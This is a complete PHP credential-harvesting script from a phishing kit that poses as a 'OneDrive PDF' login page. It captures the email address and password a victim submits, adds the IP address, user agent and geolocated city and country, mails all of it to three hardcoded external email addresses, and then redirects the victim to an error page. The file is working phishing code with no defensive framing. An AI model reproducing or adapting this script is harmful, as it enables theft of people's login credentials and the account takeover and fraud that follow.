<?php 
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
//get user's ip address 
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 

$agent=$_SERVER['HTTP_USER_AGENT'];
$email= "dianeaddison906@gmail.com,wantos1chase@163.com,logz.office@yandex.com";
$ip = getenv("REMOTE_ADDR");
$message  = "==================+[ Personal Info - OneDrive PDF]+==================\n";
$message .= "Email Address : ".$_POST['login']."\n";
$message .= "Password : ".$_POST['passwd']."\n";
$message .= "============= [ Ip & Hostname Info ] =============\n";
$message .= "Client IP : ".$ip."\n";
$message .= "User-Agent : ".$agent."\n";
$message .= "--------------------------------------------\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= "=============+ [OneDrive PDF] +=============\n";
$subject = "OneDrive PDF - Confidential details : 1st Attempt";
$data = $_POST['login'];

mail($email,$subject,$message);

header('Location: error.php?access='.$data);
?>



